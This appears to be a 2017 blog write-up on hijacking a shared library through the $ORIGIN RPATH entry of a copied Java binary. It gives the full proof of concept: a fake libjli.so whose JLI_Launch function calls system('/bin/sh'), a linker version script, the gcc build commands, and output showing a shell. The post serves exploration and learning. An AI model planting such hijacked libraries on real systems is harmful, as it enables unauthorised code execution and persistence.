---
title: "Having fun and really no profit with $ORIGIN expansion variable in Java"
date: 2017-01-30T17:22:16+02:00
draft: false
toc: false
images:
tags:
  - elf
  - linux
  - low-level
  - shared-library
---

Having fun and really no profit with $ORIGIN expansion variable in Java
gennaio 30th, 2017

Days ago I was reading this [0] interesting article about the dynamic linker
expansion variables, and so I tought it would be fun to search for binaries
with the RPATH dynamic tag containing the $ORIGIN variable.

So digging through dynamic tags using `eu-readelf -d` I found that the java
ELF binary has the following RPATH:

```text
Library rpath: [$ORIGIN/../lib/amd64/jli:$ORIGIN/../lib/amd64]
```

Using `ldd` comes up that java searches this paths looking for the shared
object (for which I dunno really the purpose yet):

```text
libjli.so => /home/$USER/jdk1.8.0_65/jre/bin/../lib/amd64/jli/libjli.so
```

So my attempt to mess with the $ORIGIN var was to create on the same level
of the jdk directory a directory called `./bin` containing an hard-link or even
a copy of the java binary, and a directory tree on the same level of `bin`,
which had the following path:
`./lib/amd64/jli`.

Trying to run the java binary from the new `./bin/` path happened exactly what I wanted to
see:

```bash
./bin/java: error while loading shared libraries: libjli.so: cannot open shared
object file: No such file or directory`
```

So ok, let's build a shared object called that name into `lib/amd64/jli`
and see what happens...

```bash
# cat libjli.c 
int foobar(void)
{
	return 0x29a;
}
```

```bash
gcc -o libjli.so -shared -fPIC libjli.c
```

And now we try to run again the java binary:
  
```bash
./bin/java: /tmp/spike/java/bin/../lib/amd64/jli/libjli.so: no version
information available (required by ./bin/java)
./bin/java: relocation error: ./bin/java: symbol JLI_Launch, version
SUNWprivate_1.1 not defined in file libjli.so with link time reference
```

Good, looking at the main function of the java binary we find a call
to the `JLI_Launch` function:
`0x0000000000400691 <+113>:	call   0x400520 <JLI_Launch@plt>`

So we redefine our fake `libjli.so` adding the `JLI_Launch` function
and also we export the required versioning info.

```bash
# cat libjli.c 
#include 

void JLI_Launch(void)
{
	system("/bin/sh");
}
```

And now a simple version script for the linker:

```bash
#cat libjli.map
SUNWprivate_1.1 {
	global:
		JLI_Launch;		
};
```

Finally we recompile the shared object applying the linker script:

```bash
gcc -c libjli.c -fPIC
gcc -o libjli.so -shared -Wl,--version-script=libjli.map
```

Now trying to execute the java binary from the ./bin/ path:

```bash
[spike@zombie java]$ ./bin/java
sh-4.3$
```

That's all folks!

[0] https://backtrace.io/blog/blog/2016/06/29/exploiting-elf-expansion-variables/


